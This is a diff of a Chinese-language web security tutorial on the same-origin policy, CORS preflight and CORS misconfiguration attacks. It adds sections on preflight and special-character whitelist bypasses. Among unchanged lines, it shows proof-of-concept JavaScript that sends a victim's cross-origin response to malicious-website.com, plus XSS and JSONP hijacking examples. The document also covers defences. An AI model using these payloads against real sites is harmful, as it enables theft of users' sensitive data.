@@ -2,16 +2,18 @@
   - [跨域请求](#跨域请求)
   - [同源策略(SOP)](#同源策略sop)
   - [跨域资源共享（CORS）](#跨域资源共享cors)
-      - [客户端指定的Access-Control-Allow-Origin头](#客户端指定的access-control-allow-origin头)
-      - [Origin headers白名单绕过](#origin-headers白名单绕过)
-      - [null origin Header](#null-origin-header)
-      - [存在XSS的受信任源](#存在xss的受信任源)
-      - [绕过TLS加密](#绕过tls加密)
-    - [防御](#防御)
+    - [CORS预检](#cors预检)
+    - [客户端指定的Access-Control-Allow-Origin头](#客户端指定的access-control-allow-origin头)
+    - [Origin headers白名单绕过](#origin-headers白名单绕过)
+    - [特殊字符](#特殊字符)
+    - [null origin Header](#null-origin-header)
+    - [存在XSS的受信任源](#存在xss的受信任源)
+    - [绕过TLS加密](#绕过tls加密)
+  - [防御](#防御)
   - [其它跨域解决方案](#其它跨域解决方案)
     - [通过jsonp跨域](#通过jsonp跨域)
       - [jsonp劫持](#jsonp劫持)
-        - [修复方案](#修复方案)
+      - [修复方案](#修复方案)
     - [document.domain + iframe跨域](#documentdomain--iframe跨域)
     - [location.hash + iframe](#locationhash--iframe)
     - [window.name + iframe跨域](#windowname--iframe跨域)
@@ -58,8 +60,14 @@ Access-Control-Allow-Origin: *.a.com
 Access-Control-Allow-Origin: *
 ```  
 且通配符`*`和Header`Access-Control-Allow-Credentials: true`不能共存  
+### CORS预检
+在CORS规范中还有一个要求,在某些可能对服务器产生影响的请求方法发送前,浏览器需要先发送一个OPTIONS请求携带相关请求信息来确定服务器是否接受后续该要发送的请求,只有同时满足以下条件的请求才不需要先发送OPTIONS请求.  
+1. 允许的HTTP请求方法: GET,HEAD,POST.  
+2. 允许HEADER字段: Accept,Accept-Language,Content-Language,Content-Type,Range,其余Header被视为不安全的Header.  
+3. 允许的Content-Type: text/plain,multipart/form-data,application/x-www-form-urlencoded.    
 
-#### 客户端指定的Access-Control-Allow-Origin头 
+任何不同时满足以上条件的跨域请求都会需要先发送OPTIONS请求来确定服务器是否接受后续的请求.
+### 客户端指定的Access-Control-Allow-Origin头 
 Origin头:当发生跨域请求，或者同域时发送post请求，就会自动携带origin请求头,请求头origin表明了请求来自于哪个站点。包括且仅仅包括协议、域名和端口，并不包含任何路径信息.  
 
 一些应用因为要维护大量的白名单域名与自己进行通信,这时候则会采取直接从请求的`Origin`Header来自动设置`Access-Control-Allow-Origin`而没有任何检查.  
@@ -87,12 +95,19 @@ function reqListener() {
    location='//malicious-website.com/log?key='+this.responseText;
 };
 ```  
-#### Origin headers白名单绕过
+### Origin headers白名单绕过
 因为CORS不支持`*.domain`的方式来匹配,有些应用会建立一个白名单,然后将请求中的`Origin`Header字段与白名单内的域名进行匹配,如果在白名单内则自动设置对应的`Access-Control-Allow-Origin`头.  
 而白名单的实现方式则可能会造成绕过,如往往只匹配url开头或者结尾,或者使用一些不严重的正则表达式.  
 只匹配`main.com`结尾->`evilmain.com`.  
 只匹配`main.com`开头->`main.com.evil.com`
-#### null origin Header
+### 特殊字符
+使用一些特殊字符绕过正则表达式检测,比如`{`,`_`.
+![](2023-05-22-16-14-51.png)  
+`victimdomain.com{.attacker.com`浏览器实际解析时为`attacker.com`.  
+
+https://www.corben.io/advanced-cors-techniques/  
+https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397
+### null origin Header
 Origin header头支持值为null,在以下情况可能会发送null Origin Header.  
 1. 跨域重定向.
 2. 序列化数据请求.
@@ -113,18 +128,18 @@ location='malicious-website.com/log?key='+this.responseText;
 };
 </script>"></iframe>
 ```
-#### 存在XSS的受信任源
+### 存在XSS的受信任源
 当正确配置CORS名单时,如果白名单中的域存在XSS,那么则可以利用存在XSS的网站通过CORS来获取网站的敏感数据.
 ```
 https://subdomain.vulnerable-website.com/?xss=<script>cors poc</script>
 ```
-#### 绕过TLS加密
+### 绕过TLS加密
 如果应用使用https,但白名单允许使用http协议的网站进行交互,则可能导致中间人攻击.
 1. 攻击者拦截受害者的任意http请求,并将其重定向到白名单内的http协议网站.
 2. 拦截到白名单http协议网站的请求,在响应中注入对https应用的CORS请求.
 3. 浏览器请求使用https的应用获取敏感数据,因为来源在白名单中,敏感数据被返回.
 4. 攻击者收到响应中的敏感数据.
-### 防御
+## 防御
 1. 正确配置跨域请求
 如果 Web 资源包含敏感信息，则应在标头中正确指定源。Access-Control-Allow-Origin
 2.仅允许受信任的站点
@@ -147,7 +162,7 @@ function myData(data) {
 }
 <script src="http://root.cool/userinfo?fn=myData"></script>
 ```
-##### 修复方案
+#### 修复方案
 1. 接受请求时检查referer来源；
 2. 在请求中添加token并在后端进行验证；
 3. 严格过滤 callback 函数名及 JSON 里数据的输出。
